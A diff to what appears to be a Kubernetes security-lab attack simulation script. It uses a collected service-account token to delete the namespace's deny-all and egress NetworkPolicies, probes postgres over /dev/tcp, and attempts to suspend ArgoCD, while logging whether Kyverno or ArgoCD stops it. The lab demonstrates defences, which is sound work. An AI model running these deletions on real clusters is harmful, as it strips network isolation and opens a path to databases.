@@ -59,10 +59,15 @@ NP_COUNT=$(kubectl get networkpolicy \
 # PHASE 2 — EXPLOITATION (delete deny-all, open the path, use the credentials)
 # =============================================================================
 
-# ── Step 4: Delete deny-all ───────────────────────────────────────────────────
+# ── Step 4: Strip the namespace egress isolation ──────────────────────────────
+# Deleting deny-all alone is NOT enough — target-app stays egress-isolated by
+# allow-dns + allow-target-egress-* (so it can only reach DNS/backend/k8s-api,
+# and postgres stays blocked). To actually open the database path the attacker
+# removes every egress policy that isolates target-app. ArgoCD (secops-lab, never
+# suspended) restores them all in ~30s, re-sealing the path.
 emit "ATTACK" "CRITICAL" \
   "Deleting NetworkPolicy: deny-all" \
-  "Removing the namespace default-deny policy. This single deletion drops all traffic isolation — every pod can now reach every other pod."
+  "Removing the namespace default-deny policy — first step in stripping the traffic isolation that keeps the database unreachable."
 
 DELETE_RESULT=$(kubectl delete networkpolicy deny-all \
   --token="$TOKEN" \
@@ -74,20 +79,32 @@ DELETE_RESULT=$(kubectl delete networkpolicy deny-all \
 if echo "$DELETE_RESULT" | grep -q "BLOCKED\|denied\|forbidden"; then
   emit "DETECT" "SUCCESS" \
     "Kyverno: NetworkPolicy deletion blocked" \
-    "Kyverno policy protect-networkpolicies denied the delete request at admission. NetworkPolicy intact. Lateral movement window: 0 seconds."
+    "Kyverno policy protect-networkpolicies denied the delete request at admission. NetworkPolicy intact. Database path never opened — window: 0 seconds."
   exit 0
 fi
 
+# Remove the remaining egress policies that still isolate target-app. Without
+# this, target-app's egress stays limited to DNS/backend/k8s-api and postgres is
+# unreachable even with deny-all gone.
+for np in allow-dns allow-target-egress-to-backend allow-target-egress-to-k8s-api; do
+  kubectl delete networkpolicy "$np" \
+    --token="$TOKEN" \
+    --server="$APISERVER" \
+    --certificate-authority="$CA" \
+    -n "$NAMESPACE" \
+    --ignore-not-found=true 2>/dev/null || true
+done
+
 emit "ATTACK" "CRITICAL" \
-  "Network isolation destroyed — credentials now have a usable path" \
-  "NetworkPolicy deny-all is gone. All pods in $NAMESPACE can now communicate freely. The credentials collected in Phase 1 can now reach postgres. ArgoCD will restore deny-all in ~30 seconds — the window is open."
+  "Egress isolation stripped — workload can now reach the database" \
+  "deny-all plus the target-app egress policies (allow-dns, allow-target-egress-*) are gone. target-app is no longer egress-isolated and can open a direct connection to postgres. ArgoCD (secops-lab) will restore all of them in ~30s — re-sealing the path. The window is open."
 
 # ── Step 5: Probe postgres ────────────────────────────────────────────────────
 POSTGRES_RESULT=$(bash -c 'echo > /dev/tcp/postgres/5432' 2>/dev/null && echo "OPEN" || echo "blocked")
 
 emit "IMPACT" "CRITICAL" \
   "postgres:5432 → $POSTGRES_RESULT" \
-  "TCP probe result after deny-all deletion. Network path confirmed $POSTGRES_RESULT."
+  "TCP probe to the database after stripping egress isolation. Network path confirmed $POSTGRES_RESULT."
 
 # ── Step 6: Try to suspend ArgoCD (will fail) ─────────────────────────────────
 kubectl patch application secops-lab \
